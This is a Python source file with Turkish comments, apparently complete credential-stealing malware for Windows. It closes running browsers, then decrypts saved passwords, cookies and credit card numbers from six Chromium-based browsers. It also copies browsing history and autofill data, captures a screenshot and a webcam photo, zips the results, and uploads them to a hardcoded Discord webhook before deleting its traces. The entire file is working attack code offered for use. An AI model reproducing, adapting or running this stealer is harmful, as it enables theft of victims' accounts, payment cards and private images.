import os
import json
import base64
import sqlite3
import shutil
import zipfile
import tempfile
import requests
import pyautogui
import psutil
import signal
import winreg
from win32crypt import CryptUnprotectData
from Crypto.Cipher import AES
from datetime import datetime

# Tarayıcıları kapat
browsers = [
    'opera.exe',
    'opera_gx.exe',
    'chrome.exe',
    'msedge.exe',
    'yandex.exe',
    'chromium.exe'
]

for browser in browsers:
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'] and browser.lower() in proc.info['name'].lower():
            try:
                os.kill(proc.info['pid'], signal.SIGTERM)
                print(f"{proc.info['name']} (PID: {proc.info['pid']}) sonlandırıldı.")
            except Exception as e:
                print(f"{proc.info['name']} (PID: {proc.info['pid']}) sonlandırılamadı: {e}")

# Local State yolunu bul
def find_local_state(browser_name):
    paths = {
        'chrome': os.path.join(os.environ['USERPROFILE'], r'AppData\Local\Google\Chrome\User Data\Local State'),
        'opera': os.path.join(os.environ['USERPROFILE'], r'AppData\Roaming\Opera Software\Opera Stable\Local State'),
        'opera_gx': os.path.join(os.environ['USERPROFILE'], r'AppData\Roaming\Opera Software\Opera GX Stable\Local State'),
        'yandex': os.path.join(os.environ['USERPROFILE'], r'AppData\Local\Yandex\YandexBrowser\User Data\Local State'),
        'chromium': os.path.join(os.environ['USERPROFILE'], r'AppData\Local\Chromium\User Data\Local State'),
        'edge': os.path.join(os.environ['USERPROFILE'], r'AppData\Local\Microsoft\Edge\User Data\Local State'),
    }
    return paths.get(browser_name.lower())

# Secret key'i al
def get_secret_key(local_state_path):
    with open(local_state_path, 'r', encoding='utf-8') as file:
        local_state = json.loads(file.read())
    encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
    encrypted_key = encrypted_key[5:]  # Remove 'DPAPI' prefix
    secret_key = CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    return secret_key

# Şifreleri çöz
def decrypt_password(buff, secret_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(secret_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)[:-16].decode()
        return decrypted_pass
    except Exception as e:
        print(f"Failed to decrypt password: {e}")
        return ""

# Tarayıcı şifrelerini al
def get_browser_passwords(browser_name, secret_key):
    data_paths = {
        'chrome': os.path.join(os.environ['USERPROFILE'], r'AppData\Local\Google\Chrome\User Data\Default'),
        'opera': os.path.join(os.environ['USERPROFILE'], r'AppData\Roaming\Opera Software\Opera Stable'),
        'opera_gx': os.path.join(os.environ['USERPROFILE'], r'AppData\Roaming\Opera Software\Opera GX Stable'),
        'yandex': os.path.join(os.environ['USERPROFILE'], r'AppData\Local\Yandex\YandexBrowser\User Data\Default'),
        'chromium': os.path.join(os.environ['USERPROFILE'], r'AppData\Local\Chromium\User Data\Default'),
        'edge': os.path.join(os.environ['USERPROFILE'], r'AppData\Local\Microsoft\Edge\User Data\Default'),
    }
    data_path = data_paths.get(browser_name.lower())
    login_db = os.path.join(data_path, 'Login Data')

    if not os.path.exists(login_db):
        print(f"{browser_name} Login Data file not found.")
        return []

    temp_db = os.path.join(tempfile.gettempdir(), 'Login Data')
    shutil.copyfile(login_db, temp_db)

    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    data = cursor.fetchall()

    passwords = []
    for url, username, encrypted_password in data:
        decrypted_password = decrypt_password(encrypted_password, secret_key)
        if decrypted_password:
            passwords.append({'url': url, 'username': username, 'password': decrypted_password})
        else:
            print(f"Failed to decrypt {url}")

    cursor.close()
    conn.close()
    os.remove(temp_db)

    return passwords

# Tarayıcı geçmişini al
def get_browser_history(browser_name):
    data_paths = {
        'chrome': os.path.join(os.environ['USERPROFILE'], r'AppData\Local\Google\Chrome\User Data\Default'),
        'opera': os.path.join(os.environ['USERPROFILE'], r'AppData\Roaming\Opera Software\Opera Stable'),
        'opera_gx': os.path.join(os.environ['USERPROFILE'], r'AppData\Roaming\Opera Software\Opera GX Stable'),
        'yandex': os.path.join(os.environ['USERPROFILE'], r'AppData\Local\Yandex\YandexBrowser\User Data\Default'),
        'chromium': os.path.join(os.environ['USERPROFILE'], r'AppData\Local\Chromium\User Data\Default'),
        'edge': os.path.join(os.environ['USERPROFILE'], r'AppData\Local\Microsoft\Edge\User Data\Default'),
    }
    data_path = data_paths.get(browser_name.lower())
    history_db = os.path.join(data_path, 'History')

    if not os.path.exists(history_db):
        print(f"{browser_name} History file not found.")
        return []

    temp_db = os.path.join(tempfile.gettempdir(), 'History')
    shutil.copyfile(history_db, temp_db)

    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()
    cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls")
    data = cursor.fetchall()

    history = []
    for url, title, visit_count, last_visit_time in data:
        timestamp = last_visit_time / 1000000 - 11644473600  # Convert from Windows file time to Unix time
        visit_time = datetime.utcfromtimestamp(timestamp).strftime('%Y-%m-%d %H:%M:%S')
        history.append({'url': url, 'title': title, 'visit_count': visit_count, 'last_visit_time': visit_time})

    cursor.close()
    conn.close()
    os.remove(temp_db)

    return history

# Otomatik doldurma bilgilerini al
def get_autofill_data(browser_name):
    data_paths = {
        'chrome': os.path.join(os.environ['USERPROFILE'], r'AppData\Local\Google\Chrome\User Data\Default'),
        'opera': os.path.join(os.environ['USERPROFILE'], r'AppData\Roaming\Opera Software\Opera Stable'),
        'opera_gx': os.path.join(os.environ['USERPROFILE'], r'AppData\Roaming\Opera Software\Opera GX Stable'),
        'yandex': os.path.join(os.environ['USERPROFILE'], r'AppData\Local\Yandex\YandexBrowser\User Data\Default'),
        'chromium': os.path.join(os.environ['USERPROFILE'], r'AppData\Local\Chromium\User Data\Default'),
        'edge': os.path.join(os.environ['USERPROFILE'], r'AppData\Local\Microsoft\Edge\User Data\Default'),
    }
    data_path = data_paths.get(browser_name.lower())
    autofill_db = os.path.join(data_path, 'Web Data')

    if not os.path.exists(autofill_db):
        print(f"{browser_name} Web Data file not found.")
        return []

    temp_db = os.path.join(tempfile.gettempdir(), 'Web Data')
    shutil.copyfile(autofill_db, temp_db)

    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()
    cursor.execute("SELECT name, value FROM autofill")
    data = cursor.fetchall()

    autofill = []
    for name, value in data:
        autofill.append({'name': name, 'value': value})

    cursor.close()
    conn.close()
    os.remove(temp_db)

    return autofill

# Tarayıcı çerezlerini al
def get_cookies(browser_name, secret_key):
    data_paths = {
        'chrome': os.path.join(os.environ['USERPROFILE'], r'AppData\Local\Google\Chrome\User Data\Default\Network'),
        'opera': os.path.join(os.environ['USERPROFILE'], r'AppData\Roaming\Opera Software\Opera Stable'),
        'opera_gx': os.path.join(os.environ['USERPROFILE'], r'AppData\Roaming\Opera Software\Opera GX Stable\Network'),
        'yandex': os.path.join(os.environ['USERPROFILE'], r'AppData\Local\Yandex\YandexBrowser\User Data\Default\Network'),
        'chromium': os.path.join(os.environ['USERPROFILE'], r'AppData\Local\Chromium\User Data\Default\Network'),
        'edge': os.path.join(os.environ['USERPROFILE'], r'AppData\Local\Microsoft\Edge\User Data\Default\Network'),
    }
    data_path = data_paths.get(browser_name.lower())
    cookies_db = os.path.join(data_path, 'Cookies')

    if not os.path.exists(cookies_db):
        print(f"{browser_name} Cookies file not found.")
        return []

    temp_db = os.path.join(tempfile.gettempdir(), 'Cookies')
    shutil.copyfile(cookies_db, temp_db)

    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()
    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
    data = cursor.fetchall()

    cookies = []
    for host_key, name, encrypted_value in data:
        decrypted_cookie = decrypt_password(encrypted_value, secret_key)
        if decrypted_cookie:
            cookies.append({'host_key': host_key, 'name': name, 'value': decrypted_cookie})
        else:
            print(f"Failed to decrypt cookie {name} from {host_key}")

    cursor.close()
    conn.close()
    os.remove(temp_db)

    return cookies

# Tarayıcı kredi kartı bilgilerini al
def get_credit_cards(browser_name, secret_key):
    data_paths = {
        'chrome': os.path.join(os.environ['USERPROFILE'], r'AppData\Local\Google\Chrome\User Data\Default'),
        'opera': os.path.join(os.environ['USERPROFILE'], r'AppData\Roaming\Opera Software\Opera Stable'),
        'opera_gx': os.path.join(os.environ['USERPROFILE'], r'AppData\Roaming\Opera Software\Opera GX Stable'),
        'yandex': os.path.join(os.environ['USERPROFILE'], r'AppData\Local\Yandex\YandexBrowser\User Data\Default'),
        'chromium': os.path.join(os.environ['USERPROFILE'], r'AppData\Local\Chromium\User Data\Default'),
        'edge': os.path.join(os.environ['USERPROFILE'], r'AppData\Local\Microsoft\Edge\User Data\Default'),
    }
    data_path = data_paths.get(browser_name.lower())
    credit_cards_db = os.path.join(data_path, 'Web Data')

    if not os.path.exists(credit_cards_db):
        print(f"{browser_name} Web Data file not found.")
        return []

    temp_db = os.path.join(tempfile.gettempdir(), 'Web Data')
    shutil.copyfile(credit_cards_db, temp_db)

    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()
    cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
    data = cursor.fetchall()

    credit_cards = []
    for name_on_card, expiration_month, expiration_year, encrypted_number in data:
        decrypted_number = decrypt_password(encrypted_number, secret_key)
        if decrypted_number:
            credit_cards.append({
                'name_on_card': name_on_card,
                'expiration_month': expiration_month,
                'expiration_year': expiration_year,
                'card_number': decrypted_number
            })
        else:
            print(f"Failed to decrypt card number for {name_on_card}")

    cursor.close()
    conn.close()
    os.remove(temp_db)

    return credit_cards

# Ekran görüntüsü al
screenshot_path = os.path.join(tempfile.gettempdir(), 'screenshot.png')
pyautogui.screenshot(screenshot_path)

# Webcam fotoğrafı al (varsa)
def capture_webcam_photo():
    try:
        import cv2
        cap = cv2.VideoCapture(0)
        if cap.isOpened():
            ret, frame = cap.read()
            if ret:
                photo_path = os.path.join(tempfile.gettempdir(), 'webcam_photo.png')
                cv2.imwrite(photo_path, frame)
                cap.release()
                return photo_path
        cap.release()
    except Exception as e:
        print(f"Failed to capture webcam photo: {e}")
    return None

webcam_photo_path = capture_webcam_photo()

# Tarayıcı verilerini topla
def collect_browser_data():
    browser_data = {}
    for browser_name in ['chrome', 'opera', 'opera_gx', 'yandex', 'chromium', 'edge']:
        local_state_path = find_local_state(browser_name)
        if not local_state_path or not os.path.exists(local_state_path):
            print(f"{browser_name} Local State file not found.")
            continue
        
        try:
            secret_key = get_secret_key(local_state_path)
        except Exception as e:
            print(f"Failed to get secret key for {browser_name}: {e}")
            continue

        browser_data[browser_name] = {
            'passwords': get_browser_passwords(browser_name, secret_key),
            'history': get_browser_history(browser_name),
            'autofill': get_autofill_data(browser_name),
            'cookies': get_cookies(browser_name, secret_key),
            'credit_cards': get_credit_cards(browser_name, secret_key)
        }
    
    return browser_data

browser_data = collect_browser_data()

# Sistem bilgilerini al
system_info = {
    'platform': os.name,
    'system': os.uname().sysname,
    'node': os.uname().nodename,
    'release': os.uname().release,
    'version': os.uname().version,
    'machine': os.uname().machine,
    'processor': os.uname().processor,
    'cpu_count': psutil.cpu_count(logical=True),
    'memory': psutil.virtual_memory().total
}

# Verileri zip arşivine ekle
def add_to_zip(zip_path, data, file_name):
    with zipfile.ZipFile(zip_path, 'a', zipfile.ZIP_DEFLATED) as zipf:
        zipf.writestr(file_name, data)

zip_path = os.path.join(tempfile.gettempdir(), 'data.zip')

# Ekran görüntüsünü ekle
add_to_zip(zip_path, open(screenshot_path, 'rb').read(), 'screenshot.png')

# Webcam fotoğrafını ekle (varsa)
if webcam_photo_path:
    add_to_zip(zip_path, open(webcam_photo_path, 'rb').read(), 'webcam_photo.png')

# Tarayıcı verilerini ekle
for browser_name, data in browser_data.items():
    for data_type, data_content in data.items():
        file_name = f"{browser_name}_{data_type}.txt"
        add_to_zip(zip_path, json.dumps(data_content, indent=4), file_name)

# Sistem bilgilerini ekle
add_to_zip(zip_path, json.dumps(system_info, indent=4), 'system_info.txt')

# Verileri Discord webhook'una gönder
webhook_url = 'https://discord.com/api/webhooks/1266882704222195773/ff-j0XWeidPALoJkWwF6kATiKTLF2wFCVRDU1sLQ1lH-dxQD1kRoxu8VnPGbSM_Wds5o'
with open(zip_path, 'rb') as f:
    response = requests.post(webhook_url, files={'file': f})

if response.status_code == 200:
    print("Data successfully sent to Discord.")
else:
    print(f"Failed to send data to Discord. Status code: {response.status_code}")

# Geçici dosyaları sil
os.remove(screenshot_path)
if webcam_photo_path:
    os.remove(webcam_photo_path)
os.remove(zip_path)
